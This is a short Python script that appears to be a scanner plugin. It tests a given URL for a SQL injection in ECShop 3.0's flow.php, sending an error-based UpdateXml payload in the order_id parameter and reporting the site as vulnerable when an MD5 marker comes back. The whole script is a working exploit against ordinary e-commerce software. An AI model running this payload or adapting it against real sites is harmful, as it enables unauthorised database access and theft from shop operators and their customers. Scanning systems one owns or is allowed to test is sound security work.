#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/flow.php?step=repurchase"
bug ="81dc9bdb52d04dc20036dbd8313ed055"
info ="存在ecshop3.0 flow.php 参数order_id注入漏洞"

def main():
    res = HttpPost(url+payload,"order_id=1/**/Or/**/UpdateXml(1,ConCat(0x7e,(Md5(1234))),0)/**/Or/**/11#","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
